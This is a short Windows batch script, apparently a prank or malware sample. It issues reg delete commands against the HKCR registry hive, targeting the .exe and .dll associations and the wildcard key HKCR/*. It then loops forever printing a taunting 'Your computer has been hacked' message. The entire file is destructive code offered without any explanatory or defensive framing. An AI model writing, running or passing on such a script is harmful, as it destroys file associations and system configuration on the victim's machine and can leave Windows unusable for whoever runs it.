@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your computer has been hacked by cool hacker. Have a nice day. Enjoy!!!
GOTO MESSAGE